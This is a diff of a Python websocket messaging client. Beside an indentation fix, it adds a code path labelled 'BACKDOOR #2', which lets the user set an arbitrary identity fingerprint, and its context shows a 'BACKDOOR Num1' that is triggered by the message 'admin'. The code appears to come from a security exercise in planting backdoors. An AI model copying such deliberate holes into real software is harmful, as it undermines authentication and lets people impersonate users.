@@ -401,8 +401,8 @@ async def receiveMessages(websocket, stop_event):
                     # If the fingerprint doesn't exist in the clients fingerprints list
                     except ValueError:
                         # Print a warning that someone unknown to you is trying to contact you
-                            print("An unknown sender is trying to contact you. There message has been dismissed as this may be unsafe.")
-                            continue
+                        print("An unknown sender is trying to contact you. There message has been dismissed as this may be unsafe.")
+                        continue
                     
                     # BACKDOOR Num1
                     if data["message"] == "admin":
@@ -463,6 +463,11 @@ async def getPrivateKey(destSocket):
     # Schedule serialised request to be sent to everyone via the server
     await destSocket.send(serialisedRequest)
 
+# BACKDOOR #2
+async def setFingerprint():
+    print("Input fingerprint to change to: ")
+    myFingerprint = input()
+
 # This function run the blocking input function in a non-blocking way by separating it into it's own loop
 # The function asks for user input which is used within the userInterface function
 async def getUserInput(stop_event):
@@ -500,6 +505,11 @@ async def userInterface(clientSocket, stop_event):
             # CLose the socket connection and break the loop. Will shut down the client. 
             await clientSocket.close()
             break
+        elif command == "Set my fingerprint":
+            await setFingerprint()
+        else:
+            print("Incorrect input. Try again!")
+            
 
 # Main client startup function
 async def main(server):
